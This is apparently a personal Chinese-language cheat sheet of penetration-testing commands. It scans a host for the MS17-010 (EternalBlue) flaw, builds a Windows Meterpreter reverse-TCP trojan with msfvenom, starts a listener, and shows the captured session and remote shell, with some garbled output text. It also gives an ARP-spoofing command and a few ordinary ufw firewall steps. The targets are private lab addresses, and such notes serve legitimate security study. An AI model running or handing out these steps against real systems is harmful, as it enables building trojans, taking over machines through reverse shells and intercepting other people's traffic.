# msfconsole

```bash
msfconsole
# 进入控制台
```

search ms17_010 

\#永恒之蓝漏洞模板 

- use auxiliary/scanner/smb/smb_ms17_010 

show options 

- set rhosts 192.168.140.129 

\#扫描目标IP是否存在此漏洞 

- msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.26.197.13 LPORT=12345 -f exe > win2012.exe 

\#生成一个win2012.exe的木马文件，反向连接到kali主机 

- use exploit/multi/handler 

[*] Using configured payload generic/shell_reverse_tcp 

\#开启端口监听 

- set payload windows/meterpreter_reverse_tcp 

\#设置payload反弹 

show options 

\#设置参数 

- set LHOST 172.26.197.13 

LHOST => 172.26.197.13 

- set LPORT 12345 

LPORT => 12345 

\#设置反向连接IP（kali）和端口 

- run 

[*] Started reverse TCP handler on 172.26.197.13:12345 

[*] Meterpreter session 1 opened (172.26.197.13:12345 -> 172.26.192.1:2177) at 2023-12-11 23:23:41 +0800 

\#开始监听 

- shell 

Process 2016 created. 

Channel 2 created. 

Microsoft Windows [�汾 6.1.7601] 

��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ���� 

\#获取权限 

- use exploit/windows/smb/ms17_010_eternalblue 

show options 

# ufw

- apt update 
- apt -y install ufw 

\#install ufw 

- ufw enable 

\#turn on ufw 

- ufw allow 80 

\#open port 80 

- ufw status 

\#check the port open 

# arpspoof

```bash
apt install -y dsniff ssldump
```

```bash
arpspoof -i eth0 -t target -r host
```

